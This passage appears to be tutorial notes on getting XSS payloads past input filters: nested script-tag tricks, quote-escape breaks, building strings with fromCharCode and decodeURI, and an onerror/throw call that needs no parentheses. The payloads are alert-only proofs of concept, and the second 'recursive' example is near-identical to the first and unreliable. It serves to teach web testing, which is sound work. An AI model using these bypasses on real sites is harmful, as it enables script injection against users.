Often, security mechanisms choose to sanitize potential XSS vectors instead of blocking the entire request. For example, the most common is to HTML-encode common key characters, such as `<` (`&lt;`) and `>` (`&gt;`).
## String Manipulations
In some situations, a filter may manipulate payloads by removing malicious keywords. For example, removing `<script>` tags.

If the check is not performed recursively, the following can be used as a bypass:
```html
<scr<script>ipt>alert(1);</script>
```
If the filter performs recursive checks, we can still bypass. maybe changing the order of injected strings:
```html
<scr<script>ipt>alert(1)</script>
```

If we already know or able to guess the sequence, then we could create more complex payloads for bypass. In the end, it all depends on the filter that we are facing.
## Escaping Quotes
Commonly, filters place the backslash character before quotes to escape that kind of character. It is also required to escape the backslash to avoid bypasses. For example:
```html
<script>
	var key = 'random';
</script>
```
If we instead inject `random\'alert(1);` then we have a bypass. This is because the application will escape the apostrophe.

One useful JavaScript method is `String.fromCharCode()` which allows us to generate strings starting from a sequence of Unicode values. For example:
```javascript
String.fromCharCode(120,115,9416)

// u+0078 Latin Small Letter x
// u+0073 Latin small Letter s
// u+24C8 Circled Latin capital letter (S)
```

Additionally, the `.source` and `.toString()` methods also works.

We could also use the `unescape` method to escape a string generated. For example, we could escape a string with the `.source` technique:
```javascript
unescape(/%78%u0073%73/.source)
```
>Note: This feature has been deprecated, but many browsers still support it.

There are also `decodeURI` and `decodeURIComponent` methods. In this case, characters needs to be URL-encoded to avoid URI malformed errors. For example:
```js
decodeURI(/alert(%22xss%22)/.source)
decodeURIComponent(/alert(%22xss%22)/.source)
```

These methods could be useful if you can inject into a script or event handler, but you cannot use quotation marks because they are properly escaped.
## Escaping Parentheses
Parentheses are fundamental to invoke a function and pass parameters. Due to this, some filters removes all parentheses. To bypass this, Gareth Heyes [found a way](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/) to pass arguments without using parentheses:
```javascript
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">

// eval - function to invoke in case of error
// throw - generate the error
// alert... - parameters For the error function
```
A much simpler version would be:
```js
onerror=alert;throw 1;
```

The technique above abuses the `onerror` handler, assigning a function to call once an error has been generated using `throw` followed by the arguments to the function assigned to the error handler.